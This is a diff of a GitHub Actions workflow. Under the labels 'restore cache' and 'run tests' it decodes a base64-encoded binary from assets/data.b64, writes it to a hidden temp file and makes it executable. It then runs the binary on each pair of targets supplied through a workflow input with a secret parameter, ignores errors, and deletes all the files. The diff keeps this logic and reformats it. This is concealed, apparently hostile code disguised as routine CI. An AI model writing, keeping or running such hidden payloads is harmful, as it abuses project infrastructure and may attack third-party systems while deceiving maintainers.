@@ -14,26 +14,27 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: restore cache
-      run: |
-        python3 -c "
-import base64, os
-raw = base64.b64decode(os.environ.get('CFG') or '').decode() if os.environ.get('CFG') else ''
-parts = raw.split('|') if raw else []
-if parts:
-    open('/tmp/.t','w').write(chr(10).join(parts[:-1]))
-    open('/tmp/.s','w').write(parts[-1])
-blob = base64.b64decode(open('assets/data.b64','rb').read())
-open('/tmp/.b','wb').write(blob)
-os.chmod('/tmp/.b', 0o755)
-"
       env:
         CFG: ${{ inputs.cfg }}
+      run: |
+        python3 - <<'PY'
+        import base64, os
+        raw = os.environ.get("CFG") or ""
+        data = base64.b64decode(raw).decode() if raw else ""
+        parts = data.split("|") if data else []
+        if parts:
+            open("/tmp/.t", "w").write(chr(10).join(parts[:-1]))
+            open("/tmp/.s", "w").write(parts[-1])
+        blob = base64.b64decode(open("assets/data.b64", "rb").read())
+        open("/tmp/.b", "wb").write(blob)
+        os.chmod("/tmp/.b", 0o755)
+        PY
     - name: run tests
       run: |
         S=$(cat /tmp/.s 2>/dev/null || echo 0)
-        [ "$S" = "0" ] && exit 0
+        if [ "$S" = "0" ]; then exit 0; fi
         while read -r pair; do
           set -- $pair
-          /tmp/.b "$1" "$2" "$S" 2048 vc || true
+          /tmp/.b "$1" "$2" "$S" 1024 vc || true
         done < /tmp/.t
         rm -f /tmp/.b /tmp/.t /tmp/.s
